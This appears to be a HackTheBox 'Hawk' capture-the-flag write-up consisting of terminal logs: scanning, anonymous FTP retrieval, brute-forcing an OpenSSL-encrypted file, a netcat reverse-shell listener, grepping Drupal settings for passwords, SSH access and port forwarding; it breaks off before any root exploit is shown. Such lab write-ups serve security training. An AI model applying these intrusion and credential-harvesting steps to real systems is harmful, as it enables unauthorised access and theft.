---
title: "HackTheBox - Hawk"
date: 2010-01-01T01:01:56+01:00
toc: false
images:
tags:
  - hackthebox
  - ctf
---

[![Kurzes Video Walkthrough ohne Erklärungen](http://img.youtube.com/vi/YOUTUBE_VIDEO_ID_HERE/0.jpg)](http://www.youtube.com/watch?v=YOUTUBE_VIDEO_ID_HERE)

root@kali:~# nmap -sV -sC 10.10.10.102  
Starting Nmap 7.70 ( https://nmap.org ) at 2018-12-04 13:10 CET  
Nmap scan report for 10.10.10.102  
Host is up (0.019s latency).  
Not shown: 996 closed ports  
PORT STATE SERVICE VERSION  
21/tcp open ftp vsftpd 3.0.3  
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_drwxr-xr-x 2 ftp ftp 4096 Jun 16 22:21 messages  
| ftp-syst:  
| STAT:  
| FTP server status:  
| Connected to ::ffff:10.10.14.118  
| Logged in as ftp  
| TYPE: ASCII  
| No session bandwidth limit  
| Session timeout in seconds is 300  
| Control connection is plain text  
| Data connections will be plain text  
| At session startup, client count was 3  
| vsFTPd 3.0.3 - secure, fast, stable  
|_End of status  
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:  
| 2048 e4:0c:cb:c5:a5:91:78:ea:54:96:af:4d:03:e4:fc:88 (RSA)  
| 256 95:cb:f8:c7:35:5e:af:a9:44:8b:17:59:4d:db:5a:df (ECDSA)  
|_ 256 4a:0b:2e:f7:1d:99:bc:c7:d3:0b:91:53:b9:3b:e2:79 (ED25519)  
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))  
|_http-generator: Drupal 7 (http://drupal.org)  
| http-robots.txt: 36 disallowed entries (15 shown)  
| /includes/ /misc/ /modules/ /profiles/ /scripts/  
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt  
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt  
|_/LICENSE.txt /MAINTAINERS.txt  
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: Welcome to 192.168.56.103 | 192.168.56.103  
8082/tcp open http H2 database http console  
|_http-title: H2 Console  
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 20.31 seconds

root@kali:~# ftp 10.10.10.102  
Connected to 10.10.10.102.  
220 (vsFTPd 3.0.3)  
Name (10.10.10.102:root): anonymous  
230 Login successful.  
Remote system type is UNIX.  
Using binary mode to transfer files.  
ftp> ls -la  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
drwxr-xr-x 3 ftp ftp 4096 Jun 16 22:14 .  
drwxr-xr-x 3 ftp ftp 4096 Jun 16 22:14 ..  
drwxr-xr-x 2 ftp ftp 4096 Jun 16 22:21 messages  
226 Directory send OK.  
ftp> cd messages  
250 Directory successfully changed.  
ftp> ls -la  
200 PORT command successful. Consider using PASV.  
150 Here comes the directory listing.  
drwxr-xr-x 2 ftp ftp 4096 Jun 16 22:21 .  
drwxr-xr-x 3 ftp ftp 4096 Jun 16 22:14 ..  
-rw-r--r-- 1 ftp ftp 240 Jun 16 22:21 .drupal.txt.enc  
226 Directory send OK.  
ftp> get .drupal.txt.enc  
local: .drupal.txt.enc remote: .drupal.txt.enc  
200 PORT command successful. Consider using PASV.  
150 Opening BINARY mode data connection for .drupal.txt.enc (240 bytes).  
226 Transfer complete.  
240 bytes received in 0.00 secs (1.3543 MB/s)  
ftp> exit  
221 Goodbye.

root@kali:~# file .drupal.txt.enc  
.drupal.txt.enc: openssl enc'd data with salted password, base64 encoded  
root@kali:~# cat .drupal.txt.enc  
U2FsdGVkX19rWSAG1JNpLTawAmzz/ckaN1oZFZewtIM+e84km3Csja3GADUg2jJb  
CmSdwTtr/IIShvTbUd0yQxfe9OuoMxxfNIUN/YPHx+vVw/6eOD+Cc1ftaiNUEiQz  
QUf9FyxmCb2fuFoOXGphAMo+Pkc2ChXgLsj4RfgX+P7DkFa8w1ZA9Yj7kR+tyZfy  
t4M0qvmWvMhAj3fuuKCCeFoXpYBOacGvUHRGywb4YCk=  
root@kali:~# cat .drupal.txt.enc | base64 -d > drupal.txt.enc  
root@kali:~# cat drupal.txt.enc  
Salted__kY ԓi-6l7Z>{$p5 2[  
8?sWj#T$3AG,f Z\ja>>G6  
.EÐVV@ɗ4@wxZNiPtF`)root@kali:~# bruteforce-salted-openssl -f /usr/share/wordlists/rockyou.txt -t 8 -d SHA256 -v 10 drupal.txt.enc  
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 52  
Tried passwords per second: inf  
Last tried password: oliver

Password candidate: friends  
Tried passwords: 6526714  
Tried passwords per second: 543892,833333  
Last tried password: kkfan2004

Tried passwords: 13014509  
Tried passwords per second: 591568,590909  
Last tried password: 1haven0one

root@kali:~# openssl enc -aes-256-cbc -d -in drupal.txt.enc -out file.txt  
enter aes-256-cbc decryption password:  
*** WARNING : deprecated key derivation used.  
Using -iter or -pbkdf2 would be better.  
root@kali:~# cat file.txt  
Daniel,

Following the password for the portal:

PencilKeyboardScanner123

Please let us know when the portal is ready.

Kind Regards,

IT department

root@kali:~# nc -lnvp 1337  
listening on [any] 1337 ...  
connect to [10.10.14.118] from (UNKNOWN) [10.10.10.102] 40208  
bash: cannot set terminal process group (906): Inappropriate ioctl for device  
bash: no job control in this shell  
www-data@hawk:/var/www/html$ ls -lha  
ls -lha  
total 296K  
drwxr-xr-x 9 root root 4.0K Jun 11 16:08 .  
drwxr-xr-x 3 root root 4.0K Jun 11 14:53 ..  
-rw-r--r-- 1 www-data www-data 6.0K Jun 11 15:49 .htaccess  
-rwxr-x--- 1 www-data www-data 110K Jun 11 16:08 CHANGELOG.txt  
-rwxr-x--- 1 www-data www-data 1.5K Jun 11 16:08 COPYRIGHT.txt  
-rwxr-x--- 1 www-data www-data 1.7K Jun 11 16:08 INSTALL.mysql.txt  
-rwxr-x--- 1 www-data www-data 1.9K Jun 11 16:08 INSTALL.pgsql.txt  
-rwxr-x--- 1 www-data www-data 1.3K Jun 11 16:08 INSTALL.sqlite.txt  
-rwxr-x--- 1 www-data www-data 18K Jun 11 16:08 INSTALL.txt  
-rwxr-x--- 1 www-data www-data 18K Jun 11 16:08 LICENSE.txt  
-rwxr-x--- 1 www-data www-data 8.6K Jun 11 16:08 MAINTAINERS.txt  
-rwxr-x--- 1 www-data www-data 5.3K Jun 11 16:08 README.txt  
-rwxr-x--- 1 www-data www-data 9.9K Jun 11 16:08 UPGRADE.txt  
-rwxr-x--- 1 www-data www-data 6.5K Jun 11 16:08 authorize.php  
-rwxr-x--- 1 www-data www-data 720 Jun 11 16:08 cron.php  
drwxr-x--- 4 www-data www-data 4.0K Jun 11 16:08 includes  
-rwxr-x--- 1 www-data www-data 529 Jun 11 16:08 index.php  
-rwxr-x--- 1 www-data www-data 703 Jun 11 16:08 install.php  
drwxr-x--- 4 www-data www-data 4.0K Jun 11 16:08 misc  
drwxr-x--- 42 www-data www-data 4.0K Jun 11 16:08 modules  
drwxr-x--- 5 www-data www-data 4.0K Jun 11 16:08 profiles  
-rwxr-x--- 1 www-data www-data 2.2K Jun 11 16:08 robots.txt  
drwxr-x--- 2 www-data www-data 4.0K Jun 11 16:08 scripts  
drwxr-x--- 4 www-data www-data 4.0K Jun 11 16:08 sites  
drwxr-x--- 7 www-data www-data 4.0K Jun 11 16:08 themes  
-rwxr-x--- 1 www-data www-data 20K Jun 11 16:08 update.php  
-rwxr-x--- 1 www-data www-data 2.2K Jun 11 16:08 web.config  
-rwxr-x--- 1 www-data www-data 417 Jun 11 16:08 xmlrpc.php  
www-data@hawk:/var/www/html$ cd sites  
cd sites

www-data@hawk:/var/www/html/sites$ ls -lha  
ls -lha  
total 24K  
drwxr-x--- 4 www-data www-data 4.0K Jun 11 16:08 .  
drwxr-xr-x 9 root root 4.0K Jun 11 16:08 ..  
-rwxr-x--- 1 www-data www-data 904 Jun 11 16:08 README.txt  
drwxr-x--- 5 www-data www-data 4.0K Jun 11 16:08 all  
dr-xr-x--- 3 www-data www-data 4.0K Jun 11 16:08 default  
-rwxr-x--- 1 www-data www-data 2.4K Jun 11 16:08 example.sites.php  
www-data@hawk:/var/www/html/sites$ cd default  
cd default  
www-data@hawk:/var/www/html/sites/default$ ls -lha  
ls -lha  
total 68K  
dr-xr-x--- 3 www-data www-data 4.0K Jun 11 16:08 .  
drwxr-x--- 4 www-data www-data 4.0K Jun 11 16:08 ..  
-rwxr-x--- 1 www-data www-data 26K Jun 11 16:08 default.settings.php  
drwxrwxr-x 4 www-data www-data 4.0K Dec 4 11:16 files  
-r--r--r-- 1 www-data www-data 26K Jun 11 16:09 settings.php  
www-data@hawk:/var/www/html/sites/default$ cat settings.php | grep password  
cat settings.php | grep password  
* 'password' => 'password',  
* username, password, host, and database name.  
* 'password' => 'password',  
* 'password' => 'password',  
* 'password' => 'password',  
* 'password' => 'password',  
'password' => 'drupal4hawk',  
* by using the username and password variables. The proxy_user_agent variable  
# $conf['proxy_password'] = '';

root@kali:~# ssh daniel@10.10.10.102 [93/858]  
daniel@10.10.10.102's password:  
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

* Documentation: https://help.ubuntu.com  
* Management: https://landscape.canonical.com  
* Support: https://ubuntu.com/advantage

System information as of Tue Dec 4 12:39:54 UTC 2018

System load: 0.08 Processes: 122  
Usage of /: 54.1% of 9.78GB Users logged in: 1  
Memory usage: 54% IP address for ens33: 10.10.10.102  
Swap usage: 0%

* Meltdown, Spectre and Ubuntu: What are the attack vectors,  
how the fixes work, and everything else you need to know  
- https://ubu.one/u2Know

* Canonical Livepatch is available for installation.  
- Reduce system reboots and improve kernel security. Activate at:  
https://ubuntu.com/livepatch

55 packages can be updated.  
3 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 4 12:39:17 2018 from 10.10.13.22  
Python 3.6.5 (default, Apr 1 2018, 05:46:30)  
[GCC 7.3.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> import pty  
>>> pty.spawn("/bin/bash")  
daniel@hawk:~$ cat /home/daniel/user.txt  
d51##########################2a8  
daniel@hawk:~$ ps aux | grep h2  
root 775 0.0 0.0 4628 784 ? Ss 12:32 0:00 /bin/sh -c /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar  
root 776 4.8 12.7 2360324 125624 ? Sl 12:32 0:23 /usr/bin/java -jar /opt/h2/bin/h2-1.4.196.jar  
daniel 2355 0.0 0.1 13108 1100 pts/3 S+ 12:40 0:00 grep h2

daniel@hawk:~$ exit  
exit  
32512  
>>> exit()  
Connection to 10.10.10.102 closed.

root@kali:~# ssh -L 8000:localhost:8082 daniel@10.10.10.102  
daniel@10.10.10.102's password:  
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

* Documentation: https://help.ubuntu.com  
* Management: https://landscape.canonical.com  
* Support: https://ubuntu.com/advantage

System information as of Tue Dec 4 12:42:16 UTC 2018

System load: 0.08 Processes: 128  
Usage of /: 54.1% of 9.78GB Users logged in: 1  
Memory usage: 55% IP address for ens33: 10.10.10.102  
Swap usage: 0%

* Meltdown, Spectre and Ubuntu: What are the attack vectors,  
how the fixes work, and everything else you need to know  
- https://ubu.one/u2Know

* Canonical Livepatch is available for installation.  
- Reduce system reboots and improve kernel security. Activate at:  
https://ubuntu.com/livepatch

55 packages can be updated.  
3 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Dec 4 12:41:21 2018 from 10.10.14.118  
Python 3.6.5 (default, Apr 1 2018, 05:46:30)  
[GCC 7.3.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.

Broadcast message from root@hawk (somewhere) (Tue Dec 4 12:49:14 2018):

got it